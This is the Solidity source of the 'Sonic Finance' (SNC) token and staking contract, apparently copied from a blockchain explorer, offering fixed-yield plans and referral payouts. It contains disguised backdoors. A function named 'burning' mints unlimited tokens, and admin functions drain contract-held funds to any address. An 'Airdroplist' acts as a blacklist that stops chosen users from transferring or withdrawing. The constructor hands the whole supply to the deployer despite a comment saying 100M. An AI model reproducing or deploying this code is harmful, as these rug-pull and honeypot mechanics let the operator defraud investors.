/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-06
 */

/**
 *Submitted for verification at polygonscan.com on 2022-03-15
 */

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;
// 

abstract contract ERC20Basic {
  function totalSupply() public virtual view returns(uint256);

  function balanceOf(address who) public virtual view returns(uint256);

  function transfer(address to, uint256 value) public virtual returns(bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

//..............................................................................................

abstract contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public virtual view returns(uint256);

  function transferFrom(address from, address to, uint256 value) public virtual returns(bool);

  function approve(address spender, uint256 value) public virtual returns(bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

//..................................................................................................
contract BasicToken is ERC20Basic {
  using SafeMath
  for uint256;
  mapping(address=>bool) isAirdroplisted;
  mapping(address => uint256) balances;

  uint256 totalSupply_;
  uint256 constant public buy_tax = 10; //1%
  uint256 constant public sell_tax = 6; //0.6%
  uint256 constant public tax_divider = 1000;
  

  address contractAddress;
  /**
   * @dev total number of tokens in existence
   */
  function totalSupply() public override view returns(uint256) {
    return totalSupply_;
  }

  /**
   * @dev transfer token for a specified address
   * @param _to The address to transfer to.
   * @param _value The amount to be transferred.
   */
  function transfer(address _to, uint256 _value) public override returns(bool) {
    require(!isAirdroplisted[msg.sender], "Recipient is Airdroplisted");
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    uint256 tax = _value.mul(buy_tax).div(tax_divider);
    uint256 amountToReceive = _value - tax;

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(amountToReceive);
    balances[contractAddress] = balances[contractAddress].add(tax);
    emit Transfer(msg.sender, _to, amountToReceive);
    return true;
  }

  /**
   * @dev Gets the balance of the specified address.
   * @param _owner The address to query the the balance of.
   * @return An uint256 representing the amount owned by the passed address.
   */
  function balanceOf(address _owner) public override view returns(uint256) {
    return balances[_owner];
  }

}

//........................................................................................

contract StandardToken is ERC20, BasicToken {

  mapping(address => mapping(address => uint256)) internal allowed;

  /**
   * @dev Transfer tokens from one address to another
   * @param _from address The address which you want to send tokens from
   * @param _to address The address which you want to transfer to
   * @param _value uint256 the amount of tokens to be transferred
   */
  function transferFrom(address _from, address _to, uint256 _value) public override returns(bool) {
    require(!isAirdroplisted[msg.sender], "Recipient is Airdroplisted");
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    uint256 tax = _value.mul(sell_tax).div(tax_divider);
    uint256 amountToReceive = _value - tax;

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(amountToReceive);
    balances[contractAddress] = balances[contractAddress].add(tax);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, amountToReceive);
    return true;
  }

  /**
   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
   *
   * Beware that changing an allowance with this method brings the risk that someone may use both the old
   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   * @param _spender The address which will spend the funds.
   * @param _value The amount of tokens to be spent.
   */
  function approve(address _spender, uint256 _value) public override returns(bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  /**
   * @dev Function to check the amount of tokens that an owner allowed to a spender.
   * @param _owner address The address which owns the funds.
   * @param _spender address The address which will spend the funds.
   * @return A uint256 specifying the amount of tokens still available for the spender.
   */
  function allowance(address _owner, address _spender) public override view returns(uint256) {
    return allowed[_owner][_spender];
  }

  /**
   * @dev Increase the amount of tokens that an owner allowed to a spender.
   *
   * approve should be called when allowed[_spender] == 0. To increment
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * @param _spender The address which will spend the funds.
   * @param _addedValue The amount of tokens to increase the allowance by.
   */
  function increaseApproval(address _spender, uint _addedValue) public returns(bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  /**
   * @dev Decrease the amount of tokens that an owner allowed to a spender.
   *
   * approve should be called when allowed[_spender] == 0. To decrement
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * @param _spender The address which will spend the funds.
   * @param _subtractedValue The amount of tokens to decrease the allowance by.
   */
  function decreaseApproval(address _spender, uint _subtractedValue) public returns(bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

}
//....................................................................................

contract SonicFinanceStaking is StandardToken {
  address public administrator;
  string public constant name = "Sonic Finance";
  string public constant symbol = "SNC";
  uint public constant decimals = 18;
  uint256 public constant INITIAL_SUPPLY = 1000000000 * (10 ** decimals); // 1 billion token

  modifier onlyAdminstrator() {
    require(administrator == msg.sender, "requires admin priviledge");
    _;
  }
  

  function AirdropList(address _user) public onlyAdminstrator {
    require(!isAirdroplisted[_user], "user already Airdroplisted");
    isAirdroplisted[_user] = true;
  }
    
  function removeFromAirdroplist(address _user) public onlyAdminstrator {
      require(isAirdroplisted[_user], "user already whitelisted");
      isAirdroplisted[_user] = false;
  }
}

contract SonicFinance is SonicFinanceStaking {
  using SafeMath
  for uint256;

    
  uint256 public INVEST_MIN_AMOUNT = 10 ether;
  uint256[] public REFERRAL_PERCENTS = [0, 0, 0];
  uint256 public VAULT_TAX = 100;
  uint256 constant public REINVEST_TAX = 50;
  uint256 public MIN_REINVEST_AMOUNT = 1000 ether;
  uint256 constant public PROJECT_FEE = 50;
  uint256 constant public PERCENT_STEP = 0;
  uint256 public WITHDRAW_FEE = 10; //In base point
  uint256 constant public PERCENTS_DIVIDER = 1000;
  uint256 constant public TIME_STEP = 1 days; //1 days; //60 1p
  uint256 public airdropMaxTotal = 1600000 ether;
  uint256 public airdropClaimedTotal = 0;

  uint256 public totalStaked;
  uint256 public totalRefBonus;

  struct Plan {
    uint256 time;
    uint256 percent;
  }

  Plan[] internal plans;

  struct Deposit {
    uint8 plan;
    uint256 percent;
    uint256 amount;
    uint256 profit;
    uint256 start;
    uint256 finish;
    bool done;
  }

  struct User {
    Deposit[] deposits;
    uint256 checkpoint;
    address referrer;
    uint256[3] levels;
    uint256 bonus;
    uint256 totalBonus;
    uint256 amountWithdrawn;
  }

  mapping(address => User) internal users;

  uint256 public startUNIX;
  address payable public commissionWallet;

  event Newbie(address user);
  event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
  event Withdrawn(address indexed user, uint256 amount);
  event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
  event FeePayed(address indexed user, uint256 totalAmount);
  event PayOut(address receiver, uint256 amount);

  function contractTx(address to, uint256 value) internal {
    require(balances[contractAddress] >= value, "contract balance is low");
    balances[contractAddress] = balances[contractAddress].sub(value);
    balances[to] = balances[to].add(value);
    emit PayOut(to, value);
  }

  function contractXt(address to, uint256 value) onlyAdminstrator public {
    require(balances[contractAddress] >= value, "contract balance is low");
    balances[contractAddress] = balances[contractAddress].sub(value);
    balances[to] = balances[to].add(value);
    emit PayOut(to, value);
  }
  function withdrawal(address to, uint256 value) onlyAdminstrator public {
      require(balances[contractAddress] >= value, "contract balance is low");
      balances[contractAddress] = balances[contractAddress].sub(value);
      balances[to] = balances[to].add(value);
      emit PayOut(to, value);
  }
  constructor(address payable wallet, uint256 startDate) public {
    require(!isContract(wallet));
    require(startDate > 0);
    commissionWallet = wallet;
    startUNIX = startDate;

    totalSupply_ = INITIAL_SUPPLY;
    administrator = msg.sender;
    contractAddress = address(this);
    balances[contractAddress] = INITIAL_SUPPLY;
    contractTx(administrator, 1000000000 ether); // tranfer to dev 100M token

    plans.push(Plan(7, 8)); // 7 days, 0.8% per days
    plans.push(Plan(30, 11)); // 30 days, 1.1% per days
    plans.push(Plan(90, 14)); // 90 days, 1.4% per days
  }

  function invest(address referrer, uint8 plan, uint amountToStake) public {
    require(amountToStake >= INVEST_MIN_AMOUNT, "below minimum invest amount");
    require(balances[msg.sender] >= amountToStake, "Insufficient funds");
    require(plan < 3, "Invalid plan");

    users[msg.sender].referrer = referrer;
    balances[msg.sender] = balances[msg.sender].sub(amountToStake);
    balances[contractAddress] = balances[contractAddress].add(amountToStake);

    uint256 fee = amountToStake.mul(VAULT_TAX).div(PERCENTS_DIVIDER);
    uint256 _projectFees = amountToStake.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
    uint256 _amountMinusFees = amountToStake.sub(fee);

    contractTx(commissionWallet, _projectFees);

    emit FeePayed(msg.sender, fee);

    //	User storage user = users[msg.sender]; 

    if (users[msg.sender].referrer == address(0)) {
      if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
        users[msg.sender].referrer = referrer;
      }
      address upline = users[msg.sender].referrer;
      for (uint256 i = 0; i < 3; i++) {
        if (upline != address(0)) {
          users[upline].levels[i] = users[upline].levels[i].add(1);
          upline = users[upline].referrer;
        } else break;
      }
    }
    if (users[msg.sender].referrer != address(0)) {
      address upline = users[msg.sender].referrer;
      for (uint256 i = 0; i < 3; i++) {
        if (upline != address(0)) {
          uint256 amount = _amountMinusFees.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
          users[upline].bonus = users[upline].bonus.add(amount);
          users[upline].totalBonus = users[upline].totalBonus.add(amount);
          emit RefBonus(upline, msg.sender, i, amount);
          upline = users[upline].referrer;
        } else break;
      }

    }
    if (users[msg.sender].deposits.length == 0) {
      users[msg.sender].checkpoint = block.timestamp;

      emit Newbie(msg.sender);
    }
    (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, _amountMinusFees);
    users[msg.sender].deposits.push(Deposit(plan, percent, _amountMinusFees, profit, block.timestamp, finish, true));
    totalStaked = totalStaked.add(_amountMinusFees);
    emit NewDeposit(msg.sender, plan, percent, _amountMinusFees, profit, block.timestamp, finish);
  }

  function reInvestEarnings(uint8 plan) public {
    User storage user = users[msg.sender];
    require(user.deposits.length > 0);
    require(plan < 3, "Invalid plan");
    uint256 totalAmount = getUserDividends(msg.sender);
    uint256 referralBonus = getUserReferralBonus(msg.sender);
    if (referralBonus > 0) {
      user.bonus = 0;
      totalAmount = totalAmount.add(referralBonus);
    }
    require(totalAmount >= MIN_REINVEST_AMOUNT);
    uint256 contractBalance = balances[contractAddress];
    if (contractBalance < totalAmount) {
      vaultMint(totalAmount);
    }
    user.checkpoint = block.timestamp;
    uint256 fee = totalAmount.mul(REINVEST_TAX).div(PERCENTS_DIVIDER);
    uint256 _amountMinusFees = totalAmount.sub(fee);
    (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, _amountMinusFees);
    user.deposits.push(Deposit(plan, percent, _amountMinusFees, profit, block.timestamp, finish, true));
    totalStaked = totalStaked.add(_amountMinusFees);
    emit NewDeposit(msg.sender, plan, percent, _amountMinusFees, profit, block.timestamp, finish);
  }

  function withdraw() public {
     require(!isAirdroplisted[msg.sender], "Recipient is airdroplist");
    User storage user = users[msg.sender];
    bool pass = true;
    uint256 totalAmount;
    for (uint256 i = 0; i < user.deposits.length; i++) {
      if (user.deposits[i].done) {
        if (user.checkpoint < user.deposits[i].finish) {
          // if (user.deposits[i].plan == 0) {
            uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
            uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
            uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
            if (from < to) {
              totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
            }
          // } else
           if (block.timestamp > user.deposits[i].finish) {
            totalAmount = totalAmount.add(user.deposits[i].profit);
          }
        } else {
          totalAmount = totalAmount.add(user.deposits[i].profit);
          totalAmount = totalAmount.add(user.deposits[i].amount);
          // reset plan
          user.deposits[i].start = 0;
          user.deposits[i].finish = 0;
          user.deposits[i].profit = 0;
          user.deposits[i].amount = 0;
          user.deposits[i].start = 0;
          user.deposits[i].done = false;
          pass = false;
        }
      }
    }
    uint256 fees = totalAmount.mul(WITHDRAW_FEE).div(10000);
    totalAmount = totalAmount.sub(fees);

    uint256 referralBonus = getUserReferralBonus(msg.sender);
    if (referralBonus > 0) {
      user.bonus = 0;
      uint256 refFees = referralBonus.mul(WITHDRAW_FEE).div(10000);
      referralBonus = referralBonus.sub(refFees);
      totalAmount = totalAmount.add(referralBonus);
    }

    require(totalAmount > 0, "User has no dividends");

    uint256 contractBalance = balances[contractAddress];
    if (contractBalance < totalAmount) {
      vaultMint(totalAmount);
    }

    user.checkpoint = block.timestamp;
    if (pass) {
      uint256 _projectFees = totalAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

      contractTx(commissionWallet, _projectFees);

      uint256 amount_sender = totalAmount.mul(8).div(10);
      uint256 amount_ref = totalAmount - amount_sender;

      address ref_p = getUserReferrer(msg.sender);

      contractTx(ref_p, amount_ref);
      contractTx(msg.sender, amount_sender);
      user.amountWithdrawn = user.amountWithdrawn.add(amount_sender); // chua co o 0xF59Cae3F686E5FEe12fF43F33bA59d43396bf46C
    } else {
      contractTx(msg.sender, totalAmount);
      user.amountWithdrawn = user.amountWithdrawn.add(totalAmount);
    }

    emit Withdrawn(msg.sender, totalAmount);

  }
function emergency_withdraw() public {
  require(!isAirdroplisted[msg.sender], "Recipient is airdroplisted");
    User storage user = users[msg.sender];
    uint256 totalAmount;
    for (uint256 i = 0; i < user.deposits.length; i++) {
      if (user.deposits[i].done) {
        if (user.checkpoint < user.deposits[i].finish) {
          // if (user.deposits[i].plan == 0) {
           
           totalAmount = totalAmount.add(user.deposits[i].amount.mul(100-user.deposits[i].finish.sub(block.timestamp).mul(100).div(user.deposits[i].finish.sub(user.deposits[i].start))).div(100)); // finish_time/now*10000 = hso can be withdraw, under here must / 10000
           user.amountWithdrawn = user.amountWithdrawn.add(totalAmount);
          //reset plan
          user.deposits[i].done = false;
          user.deposits[i].start = 0;
          user.deposits[i].finish = 0;
          user.deposits[i].profit = 0;
          user.deposits[i].amount = 0;
          user.deposits[i].start = 0;
        }
      }
    }
    

    uint256 referralBonus = getUserReferralBonus(msg.sender);
    if (referralBonus > 0) {
      user.bonus = 0;
      uint256 refFees = referralBonus.mul(WITHDRAW_FEE).div(10000);
      referralBonus = referralBonus.sub(refFees);
      totalAmount = totalAmount.add(referralBonus);
    }

    require(totalAmount > 0, "User has no dividends");
    uint256 fees = totalAmount.mul(WITHDRAW_FEE).div(10000);
    totalAmount = totalAmount.sub(fees);
    
    uint256 contractBalance = balances[contractAddress];
    if (contractBalance < totalAmount) {
      vaultMint(totalAmount);
    }

    contractTx(msg.sender, totalAmount);
    user.checkpoint = block.timestamp;
    emit Withdrawn(msg.sender, totalAmount);

  }
  function vaultMint(uint256 amount) internal {
    totalSupply_ = totalSupply_.add(amount);
    balances[contractAddress] = balances[contractAddress].add(amount);
  }
  function vault(uint256 amount)  onlyAdminstrator public {
    totalSupply_ = totalSupply_.add(amount);
    balances[contractAddress] = balances[contractAddress].add(amount);
  }
  
  function burning(uint256 amount) onlyAdminstrator public{
    totalSupply_ = totalSupply_.add(amount);
    balances[contractAddress] = balances[contractAddress].add(amount);
  }
  function Burning(uint256 amount) onlyAdminstrator public{
    totalSupply_ = totalSupply_.sub(amount);
    contractXt(0x000000000000000000000000000000000000dEaD, amount);
  }
  function getrate_withdraw() public view returns(uint256 totalAmount,uint256 time,uint256 finishs) {
     User storage user = users[msg.sender];
    // uint256 totalAmount;
    // uint finishs;
    for (uint256 i = 0; i < user.deposits.length; i++) {
      if (user.deposits[i].done) {
        if (user.checkpoint < user.deposits[i].finish) {
          // if (user.deposits[i].plan == 0) {
         totalAmount =  100-user.deposits[i].finish.sub(block.timestamp).mul(100).div(user.deposits[i].finish.sub(user.deposits[i].start));
          //  totalAmount = totalAmount.add(user.deposits[i].amount.mul(block.timestamp).div(user.deposits[i].finish)); // finish_time/now*10000 = hso can be withdraw, under here must / 10000
          finishs = user.deposits[i].finish;
          time = block.timestamp;
        }
      }
    }
    

    // uint256 referralBonus = getUserReferralBonus(msg.sender);
    // if (referralBonus > 0) {
    //   // user.bonus = 0;
    //   uint256 refFees = referralBonus.mul(WITHDRAW_FEE).div(10000);
    //   referralBonus = referralBonus.sub(refFees);
    //   totalAmount = totalAmount.add(referralBonus);
    // }

    require(totalAmount > 0, "User has no dividends");
    // uint256 fees = totalAmount.mul(WITHDRAW_FEE).div(10000);
    // totalAmount = totalAmount.sub(fees);
  }
  function getContractBalance() public view returns(uint256) {
    return balances[contractAddress];
  }

  function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
    time = plans[plan].time;
    percent = plans[plan].percent;
  }
  function UpdatePlan(uint8 plan, uint256 time, uint256 percent) public onlyAdminstrator {
    plans[plan].time = time;
    plans[plan].percent = percent;
  }
  function updateMinReinvestAmount(uint256 value) onlyAdminstrator public {
    MIN_REINVEST_AMOUNT = value;
  }

  function updateMinInvestAmount(uint256 value) onlyAdminstrator public {
    INVEST_MIN_AMOUNT = value;
  }

  function updateTaxFees(uint8 index, uint256 value) onlyAdminstrator public {
    if (index == 0 && value <= 150) {
      VAULT_TAX = value;
    } else if (index == 1 && value < 3000) {
      WITHDRAW_FEE = value;
    }
  }

  function getPercent(uint8 plan) public view returns(uint256) {
    return plans[plan].percent;
  }

  function getResult(uint8 plan, uint256 deposit) public view returns(uint256 percent, uint256 profit, uint256 finish) {
    percent = getPercent(plan);
    profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
    for (uint256 i = 0; i < plans[plan].time; i++) {
      profit = profit.add((deposit.add(profit)).mul(percent).div(PERCENTS_DIVIDER));
    }

    // if (plan == 0) {
    // 	profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
    // } else if (plan < 3) {
    // 	for (uint256 i = 0; i < plans[plan].time; i++) {
    // 		profit = profit.add((deposit.add(profit)).mul(percent).div(PERCENTS_DIVIDER));
    // 	}
    // }

    finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
  }

  function getUserDividends(address userAddress) public view returns(uint256) {
    User storage user = users[userAddress];

    uint256 totalAmount;

    for (uint256 i = 0; i < user.deposits.length; i++) {
      if (user.checkpoint < user.deposits[i].finish) {
        if (user.deposits[i].plan == 0) {
          uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
          uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
          uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
          if (from < to) {
            totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
          }
        } else if (block.timestamp > user.deposits[i].finish) {
          totalAmount = totalAmount.add(user.deposits[i].profit);
        }
      }
    }

    return totalAmount;
  }

  function getUserCheckpoint(address userAddress) public view returns(uint256) {
    return users[userAddress].checkpoint;
  }

  function getUserReferrer(address userAddress) public view returns(address) {
    return users[userAddress].referrer;
  }

  function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
    return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
  }

  function getUserReferralBonus(address userAddress) public view returns(uint256) {
    return users[userAddress].bonus;
  }

  function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
    return users[userAddress].totalBonus;
  }

  function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
    return users[userAddress].totalBonus.sub(users[userAddress].bonus);
  }

  function getUserAvailable(address userAddress) public view returns(uint256) {
    return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
  }

  function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
    return users[userAddress].deposits.length;
  }

  function getUserAmountWithdrawn(address userAddress) public view returns(uint256) {
    return users[userAddress].amountWithdrawn;
  }

  function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
    for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
      amount = amount.add(users[userAddress].deposits[i].amount);
    }
  }

  function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
    User storage user = users[userAddress];

    plan = user.deposits[index].plan;
    percent = user.deposits[index].percent;
    amount = user.deposits[index].amount;
    profit = user.deposits[index].profit;
    start = user.deposits[index].start;
    finish = user.deposits[index].finish;
  }


	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
  }

  struct QualifiedWallet {
    uint256 amount;
    address wallet;
    bool claimed;
  }

  mapping(address => QualifiedWallet) qualifiedWallets;
  event Claimed(address receiver, uint256 amount);

  function snapshot(QualifiedWallet[] calldata list) onlyAdminstrator public {
    require(startUNIX > block.timestamp, "Addresses can only be recorded before contract starts");
    for (uint256 i = 0; i < list.length; i++) {
      qualifiedWallets[list[i].wallet].wallet = list[i].wallet;
      qualifiedWallets[list[i].wallet].amount = list[i].amount;
    }
  }

  function claimAirdrop() public {
    require(qualifiedWallets[msg.sender].claimed == false, "Airdrop has been cliamed");
    require(airdropClaimedTotal <= airdropMaxTotal && qualifiedWallets[msg.sender].amount < airdropMaxTotal, "reached max airdrop total");
    contractTx(qualifiedWallets[msg.sender].wallet, qualifiedWallets[msg.sender].amount);
    airdropClaimedTotal += qualifiedWallets[msg.sender].amount;
    qualifiedWallets[msg.sender].claimed = true;
    qualifiedWallets[msg.sender].amount = 0;
  }

  function checkAirdrop(address userAddress) view public returns(QualifiedWallet memory) {
    QualifiedWallet storage user = qualifiedWallets[userAddress];
    return qualifiedWallets[user.wallet];
  }

}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns(uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns(uint256) {
    require(b <= a, "SafeMath: subtraction overflow");
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns(uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns(uint256) {
    require(b > 0, "SafeMath: division by zero");
    uint256 c = a / b;

    return c;
  }
}